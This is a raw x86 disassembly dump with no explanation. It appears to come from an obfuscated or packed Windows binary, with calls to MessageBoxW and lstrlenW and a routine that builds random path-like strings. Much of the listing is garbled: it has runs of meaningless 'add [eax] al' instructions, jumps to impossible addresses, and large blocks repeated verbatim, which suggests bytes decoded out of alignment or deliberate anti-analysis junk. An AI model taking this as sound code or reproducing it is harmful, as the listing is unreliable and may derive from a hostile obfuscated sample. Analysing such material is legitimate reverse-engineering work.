jns 0xffffffffc2c14199
add [ eax ] al
add al ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x7508ec83 ] bh
adc al 0x81
out 0x53 eax
push eax
call sub_403852
mov esp 0x27d5959
xor edx 0x830f0a77
push ecx
push ebx
call sub_40384a
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x104fd1e
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_403883
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x4c ]
mov [ ebp - 0x5c ] 0x1
mov edx [ ebp - 0x38 ]
cmp edx [ ebp - 0x40 ]
jbe r-xdata
mov [ ebp - 0x2c ] 0x5245
mov eax [ ebp + 0x80 ]
xor edx edx
mov ecx 0x346d
div ecx
mov [ ebp - 0x78 ] edx
lea eax [ ebp - 0x54 ]
add eax 0xffffed1b
mov [ ebp - 0x78 ] eax
jmp r-xdata
lea edx [ ebp + 0x2c ]
movzx eax dl
shr eax 0x3
mov [ ebp - 0x8c ] eax
lea edx [ ebp + 0x8c ]
lea eax [ ebp + 0x2c ]
movzx ecx ax
and edx ecx
mov [ ebp - 0x8c ] edx
jmp r-xdata
cmp [ ebp - 0x78 ] 0x464b
jbe r-xdata
lea edx [ ebp - 0x50 ]
xor eax eax
sub eax edx
mov [ ebp - 0x88 ] eax
mov eax [ ebp + 0xc8 ]
cdq
mov ecx 0x3a0a
idiv ecx
mov [ ebp - 0x88 ] edx
jmp r-xdata
movzx ecx [ ebp + 0xc ]
cmp [ ebp - 0x8c ] ecx
ja r-xdata
mov [ ebp - 0x74 ] 0x400
mov edx [ ebp - 0x6c ]
push edx
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
push 0x1
push 0x0
mov ecx [ ebp - 0x58 ]
add ecx 0x624
push ecx
mov edx [ ebp - 0x60 ]
push edx
call [ ebp - 0x68 ]
mov [ ebp - 0x5c ] eax
xor eax eax
sub eax [ ebp - 0x44 ]
mov [ ebp - 0x7c ] eax
mov [ ebp - 0x74 ] 0x400
mov eax [ ebp - 0x6c ]
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x21c
push ecx
push 0x1
push 0x0
mov edx [ ebp - 0x58 ]
add edx 0x624
push edx
mov eax [ ebp - 0x60 ]
push eax
call [ ebp - 0x68 ]
mov [ ebp - 0x5c ] eax
lea ecx [ ebp + 0x8c ]
shr ecx 0x4
mov [ ebp - 0x7c ] ecx
jmp r-xdata
lea ecx [ ebp - 0x44 ]
movzx edx cl
cmp [ ebp - 0x88 ] edx
jbe r-xdata
mov ecx [ ebp - 0x7c ]
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x53 ] eax
mov [ ebp - 0x4f ] ecx
mov [ ebp - 0x4b ] edx
push esi
push ebp
push esi
call sub_403a75
retn 0x10
sub_40384a
push ebx
push eax
call sub_403852
mov esp 0x27d5959
xor edx 0x830f0a77
push ecx
push ebx
call sub_40384a
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x104fd1e
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_403883
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x4c ]
mov [ ebp - 0x5c ] 0x1
mov edx [ ebp - 0x38 ]
cmp edx [ ebp - 0x40 ]
jbe r-xdata
mov [ ebp - 0x2c ] 0x5245
mov eax [ ebp + 0x80 ]
xor edx edx
mov ecx 0x346d
div ecx
mov [ ebp - 0x78 ] edx
lea eax [ ebp - 0x54 ]
add eax 0xffffed1b
mov [ ebp - 0x78 ] eax
jmp r-xdata
lea edx [ ebp + 0x2c ]
movzx eax dl
shr eax 0x3
mov [ ebp - 0x8c ] eax
lea edx [ ebp + 0x8c ]
lea eax [ ebp + 0x2c ]
movzx ecx ax
and edx ecx
mov [ ebp - 0x8c ] edx
jmp r-xdata
cmp [ ebp - 0x78 ] 0x464b
jbe r-xdata
lea edx [ ebp - 0x50 ]
xor eax eax
sub eax edx
mov [ ebp - 0x88 ] eax
mov eax [ ebp + 0xc8 ]
cdq
mov ecx 0x3a0a
idiv ecx
mov [ ebp - 0x88 ] edx
jmp r-xdata
movzx ecx [ ebp + 0xc ]
cmp [ ebp - 0x8c ] ecx
ja r-xdata
mov [ ebp - 0x74 ] 0x400
mov edx [ ebp - 0x6c ]
push edx
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
push 0x1
push 0x0
mov ecx [ ebp - 0x58 ]
add ecx 0x624
push ecx
mov edx [ ebp - 0x60 ]
push edx
call [ ebp - 0x68 ]
mov [ ebp - 0x5c ] eax
xor eax eax
sub eax [ ebp - 0x44 ]
mov [ ebp - 0x7c ] eax
mov [ ebp - 0x74 ] 0x400
mov eax [ ebp - 0x6c ]
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x21c
push ecx
push 0x1
push 0x0
mov edx [ ebp - 0x58 ]
add edx 0x624
push edx
mov eax [ ebp - 0x60 ]
push eax
call [ ebp - 0x68 ]
mov [ ebp - 0x5c ] eax
lea ecx [ ebp + 0x8c ]
shr ecx 0x4
mov [ ebp - 0x7c ] ecx
jmp r-xdata
lea ecx [ ebp - 0x44 ]
movzx edx cl
cmp [ ebp - 0x88 ] edx
jbe r-xdata
mov ecx [ ebp - 0x7c ]
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x53 ] eax
mov [ ebp - 0x4f ] ecx
mov [ ebp - 0x4b ] edx
push esi
push ebp
push esi
call sub_403a75
retn 0x10
sub_403852
pop ecx
pop ecx
jge r-xdata
ja r-xdata
xor edx 0x830f0a77
push ecx
push ebx
call sub_40384a
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
add [ esp + 0x18 ] 0x6
jae 0xffffffffe8288bb1
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x104fd1e
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_403883
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x4c ]
mov [ ebp - 0x5c ] 0x1
mov edx [ ebp - 0x38 ]
cmp edx [ ebp - 0x40 ]
jbe r-xdata
mov [ ebp - 0x2c ] 0x5245
mov eax [ ebp + 0x80 ]
xor edx edx
mov ecx 0x346d
div ecx
mov [ ebp - 0x78 ] edx
lea eax [ ebp - 0x54 ]
add eax 0xffffed1b
mov [ ebp - 0x78 ] eax
jmp r-xdata
lea edx [ ebp + 0x2c ]
movzx eax dl
shr eax 0x3
mov [ ebp - 0x8c ] eax
lea edx [ ebp + 0x8c ]
lea eax [ ebp + 0x2c ]
movzx ecx ax
and edx ecx
mov [ ebp - 0x8c ] edx
jmp r-xdata
cmp [ ebp - 0x78 ] 0x464b
jbe r-xdata
lea edx [ ebp - 0x50 ]
xor eax eax
sub eax edx
mov [ ebp - 0x88 ] eax
mov eax [ ebp + 0xc8 ]
cdq
mov ecx 0x3a0a
idiv ecx
mov [ ebp - 0x88 ] edx
jmp r-xdata
movzx ecx [ ebp + 0xc ]
cmp [ ebp - 0x8c ] ecx
ja r-xdata
mov [ ebp - 0x74 ] 0x400
mov edx [ ebp - 0x6c ]
push edx
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
push 0x1
push 0x0
mov ecx [ ebp - 0x58 ]
add ecx 0x624
push ecx
mov edx [ ebp - 0x60 ]
push edx
call [ ebp - 0x68 ]
mov [ ebp - 0x5c ] eax
xor eax eax
sub eax [ ebp - 0x44 ]
mov [ ebp - 0x7c ] eax
mov [ ebp - 0x74 ] 0x400
mov eax [ ebp - 0x6c ]
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x21c
push ecx
push 0x1
push 0x0
mov edx [ ebp - 0x58 ]
add edx 0x624
push edx
mov eax [ ebp - 0x60 ]
push eax
call [ ebp - 0x68 ]
mov [ ebp - 0x5c ] eax
lea ecx [ ebp + 0x8c ]
shr ecx 0x4
mov [ ebp - 0x7c ] ecx
jmp r-xdata
lea ecx [ ebp - 0x44 ]
movzx edx cl
cmp [ ebp - 0x88 ] edx
jbe r-xdata
mov ecx [ ebp - 0x7c ]
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x53 ] eax
mov [ ebp - 0x4f ] ecx
mov [ ebp - 0x4b ] edx
push esi
push ebp
push esi
call sub_403a75
retn 0x10
sub_4039ea
pop eax
ja r-xdata
jne r-xdata
call [ 0xffffffff81027959 ]
pop eax
jno r-xdata
jo 0xffffffffe846ab42
jns r-xdata
xor ebx 0x53e90173
pop ecx
jns r-xdata
leave
call 0x35b146
adc eax 0x81027959
jae r-xdata
xor eax 0xf02795a
mov [ ebx + 0x248246c ] es
jns r-xdata
sub [ esp + 0x30 ] r-xdata
sub esp 0x4
jae r-xdata
or ecx 0x30246c81
sar [ ecx ] cl
inc eax
add [ ebx + 0x127304ec ] al
push ebp
push esp
sub esp 0x8
call sub_403a16
jae 0x5a762890
push ebx
jmp 0xffffffff83948f5d
push edx
push ebp
sub esp 0xc
call sub_403a3b
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
0x403a
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub esp 0x4
jge r-xdata
sub [ esp + 0x48 ] 0x2
jl 0x4864a6a2
add al [ ebx + 0x77d04ec ]
sub_403a16
pop edx
jns r-xdata
sub [ esp + 0x48 ] 0x2
sub esp 0x4
jge r-xdata
jl 0x4864a6a2
push edx
push ebp
sub esp 0xc
call sub_403a3b
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
0x403a
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
add al [ ebx + 0x77d04ec ]
sub_403a3b
add esp 0x4
jae r-xdata
pop ecx
jno r-xdata
jmp [ 0x5c244481 ]
jae r-xdata
ja 0xffffffffecc38f82
add [ esp + 0x5c ] r-xdata
sub esp 0x4
jne r-xdata
mov esp 0x7304c483
or al 0xe8
add eax 0x81000000
ja r-xdata
jmp 0xffffffff8d4f40c5
jg r-xdata
je rw-data
jno r-xdata
mov edi 0xc368c483
add [ eax ] al
je 0xffffffff840028e3
push ebx
call sub_403a63
jge 0xffffffff844f44cf
jne r-xdata
push 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] cl
add [ ebx + 0x545604ec ] 0x56
push eax
push ecx
call sub_403a8f
jpo 0x59284005
les ebp [ eax - 0x3d ]
jge r-xdata
or eax 0xbb067358
pop eax
jae r-xdata
call 0xe3aafe3
add [ esp + 0x10 ] 0x6
sub esp 0x4
ja r-xdata
mov ebx 0x81f5735a
jmp r-xdata
ja r-xdata
jae 0x53918ef4
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
lodsd [ esi ]
mov ecx [ ebp - 0x4f ]
mov edx [ ebp - 0x4b ]
call sub_403aaa
mov esp 0x890f0573
out 0xff eax
and eax 0x5c244481
0x403a
push edx
push ebp
sub esp 0xc
call sub_403a3b
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
cmp [ ebp - 0x5c ] 0x0
je r-xdata
cmp [ ebp - 0x5c ] 0x64
jne r-xdata
mov edx [ ebp - 0x58 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0x98 ] eax
push r--data
mov ecx [ ebp - 0x64 ]
push ecx
call [ ebp - 0x98 ]
mov [ ebp - 0x84 ] eax
cmp [ ebp - 0x84 ] 0x0
je r-xdata
cmp [ ebp - 0x70 ] 0xa
jl r-xdata
jmp r-xdata
push 0x0
mov eax [ ebp - 0x58 ]
add eax 0x14
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x21c
push ecx
push 0x0
call [ MessageBoxW@IAT ]
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x60 ]
push edx
call [ ebp - 0x84 ]
mov ecx [ ebp - 0x58 ]
add ecx 0x624
push ecx
call [ lstrlenW@IAT ]
test eax eax
jg r-xdata
mov [ ebp - 0x9c ] eax
mov [ ebp - 0x94 ] ecx
mov [ ebp - 0x74 ] edx
push esi
push ebx
sub esp 0x10
call sub_403478
retn 0x50
mov edx [ ebp - 0x6c ]
push edx
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
push 0x1
push 0x0
push 0x0
mov ecx [ ebp - 0x60 ]
push ecx
call [ ebp - 0x68 ]
mov [ ebp - 0x5c ] eax
jmp r-xdata
mov edx [ ebp - 0x70 ]
add edx 0x1
mov [ ebp - 0x70 ] edx
cmp [ ebp - 0x5c ] 0x0
jne r-xdata
sub_403a75
sub esp 0x4
push esi
push esp
push esi
push eax
push ecx
call sub_403a8f
jpo 0x59284005
jne r-xdata
jge r-xdata
or eax 0xbb067358
pop eax
jae r-xdata
call 0xe3aafe3
add [ esp + 0x10 ] 0x6
sub esp 0x4
ja r-xdata
mov ebx 0x81f5735a
jmp r-xdata
ja r-xdata
jae 0x53918ef4
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
lodsd [ esi ]
mov ecx [ ebp - 0x4f ]
mov edx [ ebp - 0x4b ]
call sub_403aaa
mov esp 0x890f0573
push edx
push ebp
sub esp 0xc
call sub_403a3b
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
0x403a
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
cmp [ ebp - 0x5c ] 0x0
je r-xdata
cmp [ ebp - 0x5c ] 0x64
jne r-xdata
mov edx [ ebp - 0x58 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0x98 ] eax
push r--data
mov ecx [ ebp - 0x64 ]
push ecx
call [ ebp - 0x98 ]
mov [ ebp - 0x84 ] eax
cmp [ ebp - 0x84 ] 0x0
je r-xdata
cmp [ ebp - 0x70 ] 0xa
jl r-xdata
jmp r-xdata
push 0x0
mov eax [ ebp - 0x58 ]
add eax 0x14
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x21c
push ecx
push 0x0
call [ MessageBoxW@IAT ]
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x60 ]
push edx
call [ ebp - 0x84 ]
mov ecx [ ebp - 0x58 ]
add ecx 0x624
push ecx
call [ lstrlenW@IAT ]
test eax eax
jg r-xdata
mov [ ebp - 0x9c ] eax
mov [ ebp - 0x94 ] ecx
mov [ ebp - 0x74 ] edx
push esi
push ebx
sub esp 0x10
call sub_403478
retn 0x50
mov edx [ ebp - 0x6c ]
push edx
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
push 0x1
push 0x0
push 0x0
mov ecx [ ebp - 0x60 ]
push ecx
call [ ebp - 0x68 ]
mov [ ebp - 0x5c ] eax
jmp r-xdata
mov edx [ ebp - 0x70 ]
add edx 0x1
mov [ ebp - 0x70 ] edx
cmp [ ebp - 0x5c ] 0x0
jne r-xdata
sub_403a8f
pop edx
jae r-xdata
pop eax
jne r-xdata
sub ebx 0x10244483
push es
jge r-xdata
or eax 0xbb067358
ja r-xdata
jae 0x53918ef4
pop eax
jae r-xdata
call 0xe3aafe3
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
lodsd [ esi ]
mov ecx [ ebp - 0x4f ]
mov edx [ ebp - 0x4b ]
call sub_403aaa
mov esp 0x890f0573
sub esp 0x4
ja r-xdata
add [ esp + 0x10 ] 0x6
mov ebx 0x81f5735a
jmp r-xdata
cmp [ ebp - 0x5c ] 0x0
je r-xdata
cmp [ ebp - 0x5c ] 0x64
jne r-xdata
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
mov edx [ ebp - 0x58 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0x98 ] eax
push r--data
mov ecx [ ebp - 0x64 ]
push ecx
call [ ebp - 0x98 ]
mov [ ebp - 0x84 ] eax
cmp [ ebp - 0x84 ] 0x0
je r-xdata
cmp [ ebp - 0x70 ] 0xa
jl r-xdata
jmp r-xdata
push 0x0
mov eax [ ebp - 0x58 ]
add eax 0x14
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x21c
push ecx
push 0x0
call [ MessageBoxW@IAT ]
push edx
push ebp
sub esp 0xc
call sub_403a3b
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
0x403a
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x60 ]
push edx
call [ ebp - 0x84 ]
mov ecx [ ebp - 0x58 ]
add ecx 0x624
push ecx
call [ lstrlenW@IAT ]
test eax eax
jg r-xdata
mov [ ebp - 0x9c ] eax
mov [ ebp - 0x94 ] ecx
mov [ ebp - 0x74 ] edx
push esi
push ebx
sub esp 0x10
call sub_403478
retn 0x50
mov edx [ ebp - 0x6c ]
push edx
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
push 0x1
push 0x0
push 0x0
mov ecx [ ebp - 0x60 ]
push ecx
call [ ebp - 0x68 ]
mov [ ebp - 0x5c ] eax
jmp r-xdata
mov edx [ ebp - 0x70 ]
add edx 0x1
mov [ ebp - 0x70 ] edx
cmp [ ebp - 0x5c ] 0x0
jne r-xdata
sub_403aaa
jae r-xdata
pop edx
jns 0x5b002b29
jmp [ esp + 0x24 ]
xor esi 0x242464ff
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
lodsd [ esi ]
mov ecx [ ebp - 0x4f ]
mov edx [ ebp - 0x4b ]
jns r-xdata
cmp [ ebp - 0x5c ] 0x0
je r-xdata
cmp [ ebp - 0x5c ] 0x64
jne r-xdata
mov edx [ ebp - 0x58 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0x98 ] eax
push r--data
mov ecx [ ebp - 0x64 ]
push ecx
call [ ebp - 0x98 ]
mov [ ebp - 0x84 ] eax
cmp [ ebp - 0x84 ] 0x0
je r-xdata
cmp [ ebp - 0x70 ] 0xa
jl r-xdata
jmp r-xdata
push 0x0
mov eax [ ebp - 0x58 ]
add eax 0x14
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x21c
push ecx
push 0x0
call [ MessageBoxW@IAT ]
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x60 ]
push edx
call [ ebp - 0x84 ]
mov ecx [ ebp - 0x58 ]
add ecx 0x624
push ecx
call [ lstrlenW@IAT ]
test eax eax
jg r-xdata
mov [ ebp - 0x9c ] eax
mov [ ebp - 0x94 ] ecx
mov [ ebp - 0x74 ] edx
push esi
push ebx
sub esp 0x10
call sub_403478
retn 0x50
mov edx [ ebp - 0x6c ]
push edx
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
push 0x1
push 0x0
push 0x0
mov ecx [ ebp - 0x60 ]
push ecx
call [ ebp - 0x68 ]
mov [ ebp - 0x5c ] eax
jmp r-xdata
mov edx [ ebp - 0x70 ]
add edx 0x1
mov [ ebp - 0x70 ] edx
cmp [ ebp - 0x5c ] 0x0
jne r-xdata
sub_403b60
push ebp
mov ebp esp
sub esp 0xa8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x58 ] ecx
mov eax [ ebp - 0x58 ]
add eax 0x21c
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x68 ] 0x0
mov ecx [ ebp - 0x58 ]
mov edx [ ecx ]
mov [ ebp - 0xa8 ] edx
mov eax [ ebp - 0x58 ]
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x90 ] ecx
push r--data
mov edx [ ebp - 0xa8 ]
push edx
call [ ebp - 0x90 ]
mov [ ebp - 0xa4 ] eax
mov [ ebp - 0x8c ] 0x0
push r--data
mov ecx [ ebp - 0x5c ]
push ecx
call sub_404a10
add esp 0x8
sub eax [ ebp - 0x5c ]
sar eax 0x1
mov [ ebp - 0x8c ] eax
jmp r-xdata
call sub_4171b0
cdq
mov ecx 0x7fff
idiv ecx
imul edx eax 0xfffff83a
add edx 0xa
mov [ ebp - 0x60 ] edx
xor eax eax
mov ecx [ ebp - 0x68 ]
mov edx [ ebp - 0x5c ]
mov [ edx + ecx * 2 ] ax
push 0x0
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
call [ ebp - 0xa4 ]
mov ecx 0x5c
mov edx [ ebp - 0x68 ]
mov eax [ ebp - 0x5c ]
mov [ eax + edx * 2 ] cx
mov ecx [ ebp - 0x68 ]
mov edx [ ebp - 0x5c ]
lea eax [ edx + ecx * 2 + 0x2 ]
mov [ ebp - 0x5c ] eax
jmp r-xdata
mov edx [ ebp - 0x8c ]
mov [ ebp - 0x68 ] edx
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0x64 ] 0x0
cmp [ ebp - 0x60 ] 0x0
je r-xdata
mov eax [ ebp - 0x60 ]
add eax 0x1
mov [ ebp - 0x60 ] eax
cmp [ ebp - 0x60 ] 0x3e8
je r-xdata
push r--data
mov eax [ ebp - 0x5c ]
push eax
call sub_404a10
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebp - 0x74 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x6c ] 0x0
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x6c ]
cmp edx [ ebp - 0x60 ]
jae r-xdata
cmp [ ebp - 0x60 ] 0x0
je r-xdata
mov ecx [ ebp - 0x64 ]
cmp ecx [ ebp - 0x60 ]
je r-xdata
mov eax [ ebp - 0x64 ]
add eax [ ebp - 0x6c ]
mov [ ebp - 0x64 ] eax
jmp r-xdata
cmp [ ebp - 0x64 ] 0x1
je r-xdata
call sub_4171b0
cdq
mov ecx 0x7fff
idiv ecx
imul edx eax 0xfffff83a
add edx 0xa
mov [ ebp - 0x64 ] edx
mov ecx [ ebp - 0x6c ]
add ecx 0x1
mov [ ebp - 0x6c ] ecx
mov eax [ ebp - 0x58 ]
mov ecx [ eax ]
mov [ ebp - 0x9c ] ecx
mov edx [ ebp - 0x58 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0x94 ] eax
push r--data
mov ecx [ ebp - 0x9c ]
push ecx
call [ ebp - 0x94 ]
mov [ ebp - 0x7c ] eax
mov [ ebp - 0x98 ] eax
mov [ ebp - 0xa0 ] ecx
mov [ ebp - 0x70 ] edx
push esi
push ebx
sub esp 0x10
call sub_4043be
retn 0x50
sub_403d46
jne r-xdata
jno r-xdata
or edi 0x9a890f
add [ eax ] al
add esp 0x8
jno r-xdata
sub edx 0x11e890f
add [ eax ] al
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf4501e8
pop edx
jno r-xdata
mov ecx 0xe981637f
jae r-xdata
sub ecx 0xe1813e75
add [ eax + eax - 0x7af10000 ] 0xea810971
jns r-xdata
call [ 0x40246c81 ]
and [ 0xffffffffec830040 ] bh
adc [ edx + 0xf ] bl
xchg [ esi ] esp
add [ eax ] eax
add bh bh
and eax 0xce8d0f
add [ eax ] al
jg r-xdata
and ecx 0xd7850f
add [ eax ] al
jns r-xdata
jge 0xffffffffb8afbd48
pushfd
call sub_403d31
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
push ebp
call sub_403d46
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jae r-xdata
or edi 0x8d0f2c73
ja r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
pop ecx
jno r-xdata
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jae r-xdata
jae r-xdata
jg r-xdata
jne 0x24c14e11
jne r-xdata
call sub_403dd1
ja 0x504c1d8
call 0x52909611
add esp 0x4
jns r-xdata
mov eax 0xc7819173
ja r-xdata
jge 0x71fc7f19
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jns r-xdata
jmp 0xcac6f1
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jae r-xdata
sub eax 0x4d795a58
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
add esp 0x4
jne r-xdata
jg 0xffffffffff96c148
pop eax
jns r-xdata
sub eax 0xfec5e89c
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3c712
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1fda1
jns r-xdata
xor edx 0x81257159
r-xdata
jno 0x16402b8b
pop edx
jg r-xdata
jpo 0xf70b6ae
push eax
push edi
push ebp
push ecx
and ecx 0xff378f0f
ja r-xdata
and ecx 0xf681ad79
jno r-xdata
pop ecx
or eax 0xf04c483
mov ebp ebp
add esp 0x4
jno r-xdata
je 0xfffffffffed0c1ba
jne r-xdata
jno 0xffffffff834f95b5
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffcb8b0
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jae r-xdata
je 0xffffffff814fdf87
jne 0xffffffffeac146e1
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
push ecx
push edx
push ebp
sub esp 0x4
call sub_403fdd
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
jg r-xdata
jg 0xffffffff9c9491bc
ja r-xdata
jns r-xdata
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1bedb
jne r-xdata
sub edi 0x64244481
mov bh 0x46
inc eax
add [ ebx + 0x5a5928ec ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacd03e
jae r-xdata
ja 0xffffffffa3c34fd6
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
ja 0xffffffff89a47c77
push esi
push esi
call sub_403ebc
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd97b3
push edx
call sub_403df2
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jge r-xdata
call [ 0xffffffffca81677d ]
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jg r-xdata
jpo 0xdec5bc
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
